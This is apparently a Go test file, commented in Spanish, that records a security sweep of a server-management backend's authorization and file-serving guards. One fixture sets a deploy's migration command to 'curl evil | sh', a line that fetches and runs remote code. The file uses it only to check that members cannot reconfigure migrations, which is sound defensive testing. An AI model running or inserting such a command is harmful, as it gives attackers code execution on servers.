package handler

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/guz-studio/cac/backend/internal/adapters/k8s"
	"github.com/guz-studio/cac/backend/internal/core/domain"
	"github.com/guz-studio/cac/backend/internal/core/repository"
	"github.com/guz-studio/cac/backend/internal/core/service"
)

/*
Barrido de seguridad (6-oct-2026). Cualquiera puede crearse una organización y
ser su admin, así que nada de lo que toca a otros —el clúster de la plataforma,
las máquinas, las llaves de un cliente— puede depender sólo del rol en una org.
Cada prueba nombra el permiso que fija y el mutante que la mata.
*/

func superadmin() *domain.ClaimsJWT {
	return &domain.ClaimsJWT{UserID: "u-root", Username: "root", Superadmin: true}
}

// Un servidor kubernetes lee el clúster de la plataforma: sólo superadmin lo
// registra, aunque seas admin de tu org. Mutante: quitar la guarda del tipo.
func TestKubernetesServersAreSuperadminOnly(t *testing.T) {
	db, cleanup := provisioningDB(t)
	defer cleanup()
	h := NewServerHandler(service.NewServerService(repository.NewServerRepository(db)))
	body := `{"name":"k","host":"10.0.0.9","sshPort":22,"sshUser":"root","type":"kubernetes","agentPort":9090,"orgId":"org-1"}`
	crear := func(c *domain.ClaimsJWT) int {
		r := httptest.NewRequest(http.MethodPost, "/api/v1/servers/", strings.NewReader(body))
		rec := httptest.NewRecorder()
		h.CreateServer(rec, r.WithContext(serverReq(http.MethodPost, "", "", "", c).Context()))
		return rec.Code
	}
	if code := crear(claims("u-ana", "org-1", domain.OrgRoleAdmin)); code != http.StatusForbidden {
		t.Errorf("un admin de su org registrando un kubernetes → %d, se esperaba 403", code)
	}
	if code := crear(superadmin()); code != http.StatusCreated {
		t.Errorf("un superadmin → %d, se esperaba 201", code)
	}
}

// Cambiar a dónde se conecta un servidor —host, usuario, puertos— es de admin:
// la app de un admin mandaría ahí su SSH y sus pases. El nombre lo cambia
// cualquier escritor. Mutantes: no comparar la conexión; aceptar a un miembro.
func TestOnlyAnAdminRepointsAServer(t *testing.T) {
	db, cleanup := provisioningDB(t)
	defer cleanup()
	h := NewServerHandler(service.NewServerService(repository.NewServerRepository(db)))
	editar := func(body string, c *domain.ClaimsJWT) int {
		rec := httptest.NewRecorder()
		h.UpdateServer(rec, serverReq(http.MethodPatch, "srv-1", "", body, c))
		return rec.Code
	}
	mismo := `{"name":"renombrado","host":"10.0.0.1","sshPort":22,"sshUser":"root","type":"docker-swarm","agentPort":9090}`
	otroHost := `{"name":"tds","host":"203.0.113.7","sshPort":22,"sshUser":"root","type":"docker-swarm","agentPort":9090}`
	if code := editar(mismo, claims("u-ana", "org-1", domain.OrgRoleMember)); code != http.StatusOK {
		t.Errorf("un miembro cambiando el nombre → %d, se esperaba 200", code)
	}
	if code := editar(otroHost, claims("u-ana", "org-1", domain.OrgRoleMember)); code != http.StatusForbidden {
		t.Errorf("un miembro cambiando el host → %d, se esperaba 403", code)
	}
	if code := editar(otroHost, claims("u-ana", "org-1", domain.OrgRoleAdmin)); code != http.StatusOK {
		t.Errorf("un admin cambiando el host → %d, se esperaba 200", code)
	}
	convertir := `{"name":"tds","host":"203.0.113.7","sshPort":22,"sshUser":"root","type":"kubernetes","agentPort":9090}`
	if code := editar(convertir, claims("u-ana", "org-1", domain.OrgRoleAdmin)); code != http.StatusForbidden {
		t.Errorf("un admin convirtiéndolo en kubernetes → %d, se esperaba 403", code)
	}
}

// Las vistas del clúster leen el de la plataforma con la cuenta del backend:
// sólo superadmin, aunque seas miembro de la org del registro (fuera del
// clúster contesta 503, que es pasar la guarda). Mutante: volver a mirar la
// membresía.
func TestThePlatformClusterIsSuperadminOnly(t *testing.T) {
	db, cleanup := provisioningDB(t)
	defer cleanup()
	servers := service.NewServerService(repository.NewServerRepository(db))
	h := NewK8sHandler(servers, service.NewK8sHubService(k8s.New()))
	ver := func(c *domain.ClaimsJWT) int {
		rec := httptest.NewRecorder()
		h.Health(rec, serverReq(http.MethodGet, "srv-k8s", "", "", c))
		return rec.Code
	}
	if code := ver(claims("u-ana", "org-1", domain.OrgRoleAdmin)); code != http.StatusNotFound {
		t.Errorf("un admin de la org viendo el clúster → %d, se esperaba 404", code)
	}
	if code := ver(superadmin()); code == http.StatusNotFound || code == http.StatusForbidden {
		t.Errorf("un superadmin → %d, se esperaba pasar la guarda", code)
	}
}

// El pase al agente lleva el rol: un viewer lee y no reinicia. Pero a un
// agente anterior a la v5, que acepta cualquier pase para todo, un viewer no le
// pide pase. Mutantes: firmar siempre escritura; no mirar la versión del
// agente; volver a exigir miembro.
func TestTheAgentPassCarriesTheRole(t *testing.T) {
	db, cleanup := provisioningDB(t)
	defer cleanup()
	servers := service.NewServerService(repository.NewServerRepository(db))
	tok, err := servers.MintAgentToken("srv-1")
	if err != nil {
		t.Fatal(err)
	}
	h := NewAgentHandler(servers, nil)
	pedir := func(c *domain.ClaimsJWT) (int, string) {
		rec := httptest.NewRecorder()
		h.Session(rec, serverReq(http.MethodPost, "srv-1", "", "", c))
		var res struct {
			Data struct{ Token string } `json:"data"`
		}
		_ = json.Unmarshal(rec.Body.Bytes(), &res)
		subject, _ := repository.VerifyAgentSession(tok.SessionKey, "srv-1", res.Data.Token, time.Now())
		return rec.Code, subject
	}
	viewer := claims("u-vera", "org-1", domain.OrgRoleViewer)
	if code, _ := pedir(viewer); code != http.StatusForbidden {
		t.Errorf("un viewer con un agente v4 → %d, se esperaba 403", code)
	}
	if code, subject := pedir(claims("u-ana", "org-1", domain.OrgRoleMember)); code != http.StatusOK || subject != "u-ana|w" {
		t.Errorf("un miembro → %d %q, se esperaba un pase de escritura", code, subject)
	}
	if err := servers.Heartbeat("srv-1", domain.AgentVersionRoles, time.Now()); err != nil {
		t.Fatal(err)
	}
	if code, subject := pedir(viewer); code != http.StatusOK || subject != "u-vera|r" {
		t.Errorf("un viewer con un agente v5 → %d %q, se esperaba un pase de lectura", code, subject)
	}
}

// Registrar un servicio y cambiarle la configuración (el comando de
// migraciones es un `sh -c` en el servidor) es de admin; desplegar sigue siendo
// de miembro. Mutantes: devolver Create o Update a miembro.
func TestOnlyAnAdminRegistersOrReconfiguresADeployable(t *testing.T) {
	db, _, d, cleanup := deploySetup(t)
	defer cleanup()
	servers := service.NewServerService(repository.NewServerRepository(db))
	h := NewDeployHandler(servers, service.NewDeployService(repository.NewDeployRepository(db), repository.NewServerRepository(db), nil))
	registrar := func(c *domain.ClaimsJWT) int {
		rec := httptest.NewRecorder()
		h.Create(rec, serverReq(http.MethodPost, "srv-2", "",
			`{"name":"x","stack":"beta","serviceName":"beta_x","imageRepo":"ghcr.io/a/b"}`, c))
		return rec.Code
	}
	reconfigurar := func(c *domain.ClaimsJWT) int {
		r := serverReq(http.MethodPatch, "srv-1", "", `{"name":"api","onCINotify":"record","migrateCommand":"curl evil | sh"}`, c)
		chiContext(r).URLParams.Add("did", d.ID)
		rec := httptest.NewRecorder()
		h.Update(rec, r)
		return rec.Code
	}
	if code := registrar(claims("u-ana", "org-1", domain.OrgRoleMember)); code != http.StatusForbidden {
		t.Errorf("un miembro registrando un servicio → %d, se esperaba 403", code)
	}
	if code := reconfigurar(claims("u-ana", "org-1", domain.OrgRoleMember)); code != http.StatusForbidden {
		t.Errorf("un miembro cambiando las migraciones → %d, se esperaba 403", code)
	}
	if code := registrar(claims("u-ana", "org-1", domain.OrgRoleAdmin)); code != http.StatusCreated {
		t.Errorf("un admin registrando → %d, se esperaba 201", code)
	}
}

// La llave de ingesta y el webhook de un canal de cliente son de admin, igual
// que en la pantalla de proyectos. Mutante: devolver true a cualquier miembro.
func TestChannelSecretsAreAdminOnly(t *testing.T) {
	pedir := func(c *domain.ClaimsJWT) (bool, int) {
		rec := httptest.NewRecorder()
		ok := channelAdmin(rec, serverReq(http.MethodPost, "", "", "", c), "org-1")
		return ok, rec.Code
	}
	if ok, code := pedir(claims("u-ana", "org-1", domain.OrgRoleMember)); ok || code != http.StatusForbidden {
		t.Errorf("un miembro rotando la llave → %v %d", ok, code)
	}
	if ok, _ := pedir(claims("u-ana", "org-2", domain.OrgRoleAdmin)); ok {
		t.Error("el admin de otra org rotando la llave")
	}
	if ok, _ := pedir(claims("u-ana", "org-1", domain.OrgRoleAdmin)); !ok {
		t.Error("el admin de la org no pudo")
	}
	if ok, _ := pedir(superadmin()); !ok {
		t.Error("un superadmin no pudo")
	}
}

// Un adjunto servido desde el origen de cac no puede ejecutar nada: HTML y SVG
// se descargan como binario, todo lleva `nosniff`, y una imagen va con sandbox.
// Mutantes: dejar inline el SVG; quitar nosniff; respetar el tipo declarado.
func TestServedFilesCannotRunInCacsOrigin(t *testing.T) {
	cases := []struct {
		ct, wantCT, wantDisp string
		sandbox              bool
	}{
		{"text/html", "application/octet-stream", "attachment", false},
		{"image/svg+xml", "application/octet-stream", "attachment", false},
		{"application/javascript", "application/octet-stream", "attachment", false},
		{"IMAGE/PNG; charset=binary", "image/png", "inline", true},
		{"application/pdf", "application/pdf", "inline", false},
		{"", "application/octet-stream", "attachment", false},
	}
	for _, c := range cases {
		rec := httptest.NewRecorder()
		setFileHeaders(rec, c.ct, `a"b.x`)
		h := rec.Header()
		if h.Get("X-Content-Type-Options") != "nosniff" {
			t.Errorf("%q sin nosniff", c.ct)
		}
		if h.Get("Content-Type") != c.wantCT || !strings.HasPrefix(h.Get("Content-Disposition"), c.wantDisp) {
			t.Errorf("%q → %q / %q", c.ct, h.Get("Content-Type"), h.Get("Content-Disposition"))
		}
		if strings.Contains(h.Get("Content-Security-Policy"), "sandbox") != c.sandbox {
			t.Errorf("%q: sandbox = %q", c.ct, h.Get("Content-Security-Policy"))
		}
		if strings.Contains(h.Get("Content-Disposition"), `a"b`) {
			t.Errorf("el nombre puede cerrar la cabecera: %q", h.Get("Content-Disposition"))
		}
	}
}

// El proxy sólo existe en su dominio: en el de cac (donde vive la sesión web)
// contesta 404 aunque el resto sea válido. Mutante: quitar la guarda del host.
func TestTheIntegrationProxyOnlyAnswersOnItsOwnHost(t *testing.T) {
	t.Setenv("INTEGRATIONS_PROXY_HOST", "tools.guz-studio.dev")
	h := &integrationHandler{}
	r := httptest.NewRequest(http.MethodGet, "https://cac.guz-studio.dev/api/v1/servers/s/integrations/i/proxy/", nil)
	rec := httptest.NewRecorder()
	h.Proxy(rec, r)
	if rec.Code != http.StatusNotFound {
		t.Errorf("el proxy en el dominio de cac → %d, se esperaba 404", rec.Code)
	}
	t.Setenv("INTEGRATIONS_PROXY_HOST", "")
	r = httptest.NewRequest(http.MethodGet, "https://tools.guz-studio.dev/api/v1/servers/s/integrations/i/proxy/", nil)
	rec = httptest.NewRecorder()
	h.Proxy(rec, r)
	if rec.Code != http.StatusNotFound {
		t.Errorf("sin dominio configurado el proxy tiene que estar apagado → %d", rec.Code)
	}
	if !IsProxyPath("/api/v1/servers/s/integrations/i/proxy/x") || IsProxyPath("/api/v1/servers/s/integrations") || IsProxyPath("/api/v1/tasks/proxy") {
		t.Error("IsProxyPath reconoce lo que no es")
	}
}
